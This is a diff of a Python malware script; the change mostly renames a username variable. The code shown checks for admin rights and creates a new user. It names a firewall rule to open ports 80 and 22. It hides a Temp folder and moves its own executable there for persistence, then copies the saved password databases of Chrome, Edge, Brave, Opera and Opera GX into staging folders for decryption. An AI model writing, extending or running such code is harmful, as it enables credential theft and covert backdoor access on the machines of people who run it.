@@ -47,11 +47,12 @@ def is_usr_admin():  # _Checks_If_Script_Has_Admin_Privs
 
 is_usr_admin()
 
-current_user = os.getenv('username') #_Fill_These_Variable_To_Suit_Your_Needs
+CURRENT_USER = os.getenv('username')
 
+#_Fill_These_Variable_To_Suit_Your_Needs_↓↓↓↓↓↓↓↓↓↓↓
 mal_file = "($cript!).exe"  # _NAME_OF_THE_SCRIPT_MUST_GO_HERE_!!!
 
-name_of_opened_ports = "VIRUS"  #_Name_Of_The_Open_Port_Rule
+name_of_opened_ports = "DOOOOM"  #_Name_Of_The_Open_Port_Rule
 
 ports_you_want_to_open = "80,22" #_Port_Numbers_Must_Be_Seperated_By_Commas
 
@@ -101,23 +102,23 @@ create_new_usr()
 
 
 def persistence():
-    if os.path.exists("C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923") >= True:
+    if os.path.exists("C:\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923") >= True:
         print("Nice_Already_Got_Me_A_Seat")
     else:
         try:
-            mkdir("C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923")
+            mkdir("C:\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923")
         except:
             print("Error")
     sleep(1)
-    system("attrib +h C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923")
+    system("attrib +h C:\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923")
     sleep(0.1)
     #-Possible_Memory_Errors_With_Moving_File
     try:
-        move(mal_file, "C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\" + mal_file + "")
+        move(mal_file, "C:\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\" + mal_file + "")
     except:
         print("Error")
     sleep(0.1)
-    chdir("C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923")
+    chdir("C:\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923")
     
 
 persistence()
@@ -262,27 +263,27 @@ drive_drop()
 
 def temp_hq_prep():  # _Organising_Temp_Folder_For_Passwords_And_Decryption
     try:
-        mkdir("C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\chromepwds")
+        mkdir("C:\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\chromepwds")
     except:
         print("Error")
     sleep(0.1)
     try:
-        mkdir("C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\edgepwds")
+        mkdir("C:\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\edgepwds")
     except:
         print("Error")
     sleep(0.1)
     try:
-        mkdir("C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\bravepwds")
+        mkdir("C:\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\bravepwds")
     except:
         print("Error")
     sleep(0.1)
     try:
-        mkdir("C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\operapwds")
+        mkdir("C:\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\operapwds")
     except:
         print("Error")
     sleep(0.1)
     try:
-        mkdir("C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\operagxpwds")
+        mkdir("C:\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\operagxpwds")
     except:
         print("Error")
     sleep(0.1)
@@ -293,33 +294,33 @@ temp_hq_prep()
 
 def passwd_grabr():  # _Grabs_Login_Data_Files_Prepping_For_Decryption
     try:
-        copy("C:\\Users\\" + current_user + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
-                    "C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\chromepwds")
+        copy("C:\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
+                    "C:\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\chromepwds")
     except:
         print("ERROR")
         sleep(0.1)
     try:
-        copy("C:\\Users\\" + current_user + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data",
-                    "C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\edgepwds")
+        copy("C:\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data",
+                    "C:\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\edgepwds")
     except:
         print("ERROR")
         sleep(0.1)
     try:
         copy(
-            " C:\\Users\\" + current_user + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data",
-            "C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\bravepwds")
+            " C:\\Users\\" + CURRENT_USER + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data",
+            "C:\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\bravepwds")
     except:
         print("ERROR")
         sleep(0.1)
     try:
-        copy("C:\\Users\\" + current_user + "\\AppData\Roaming\\Opera Software\\Opera Stable\\Login Data",
-                    "C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\operapwds")
+        copy("C:\\Users\\" + CURRENT_USER + "\\AppData\Roaming\\Opera Software\\Opera Stable\\Login Data",
+                    "C:\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\operapwds")
     except:
         print("ERROR")
         sleep(0.1)
     try:
-        copy("C:\\Users\\" + current_user + "\\AppData\\Local\\Opera Software\\Opera GX Stable\\Login Data",
-                    "C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\operagxpwds")
+        copy("C:\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Opera Software\\Opera GX Stable\\Login Data",
+                    "C:\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\operagxpwds")
     except:
         print("ERROR")
         sleep(0.1)
